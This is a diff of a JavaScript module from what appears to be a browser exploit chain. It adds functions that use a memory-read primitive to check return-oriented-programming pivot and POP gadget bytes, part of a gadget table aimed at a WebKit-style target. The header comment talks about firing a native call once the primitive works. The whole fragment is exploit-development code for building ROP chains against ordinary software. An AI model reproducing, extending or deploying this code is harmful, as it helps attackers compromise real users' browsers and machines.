@@ -3,7 +3,7 @@
  * Separate ArrayBuffers (same as chain_poops). Fire at PRIMITIVE-OK when lk known.
  */
 import { int64 } from "./int64.js";
-import { PIVOT_ROWS, verifyPivotSet, checkPivotBytes } from "./pivot_gadgets.js";
+import { PIVOT_ROWS, verifyPivotSet, verifyPivotSetPrefix, checkPivotBytes } from "./pivot_gadgets.js";
 
 export const SYS = { getpid: 20, getuid: 0x18 };
 
@@ -28,7 +28,7 @@ const GADGET_TABLE = [
     ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
 ];
 
-export { verifyPivotSet, PIVOT_ROWS };
+export { verifyPivotSet, verifyPivotSetPrefix, PIVOT_ROWS };
 
 /** POP gadgets layoutNativeCall actually uses (not chain_poops argGadget[1..5]). */
 export const CHAIN_POP_ROWS = [
@@ -40,6 +40,35 @@ export const CHAIN_POP_ROWS = [
 /** Pivot G0-G5 + MOV_RDI_RAX + stack POP/LEAVE — chain_poops GAD table. */
 export function verifyFullChainSet(read1, base, off) {
     const pivot = verifyPivotSet(read1, base, off);
+    const popGood = [];
+    const popBad = [];
+    const popMissing = [];
+    for (let i = 0; i < CHAIN_POP_ROWS.length; i++) {
+        const label = CHAIN_POP_ROWS[i][0];
+        const key = CHAIN_POP_ROWS[i][1];
+        const pat = CHAIN_POP_ROWS[i][2];
+        const rva = off[key];
+        if (rva == null) {
+            popMissing.push(label);
+            continue;
+        }
+        if (checkPivotBytes(read1, base, rva, pat))
+            popGood.push(label);
+        else
+            popBad.push(label);
+    }
+    return {
+        ok: pivot.ok && popBad.length === 0 && popMissing.length === 0,
+        pivot,
+        popGood,
+        popBad,
+        popMissing,
+    };
+}
+
+/** Prefix pivot + POP bytes — gate for bisect/native fire (not full poops tail). */
+export function verifyBisectChainSet(read1, base, off) {
+    const pivot = verifyPivotSetPrefix(read1, base, off);
     const popGood = [];
     const popBad = [];
     const popMissing = [];
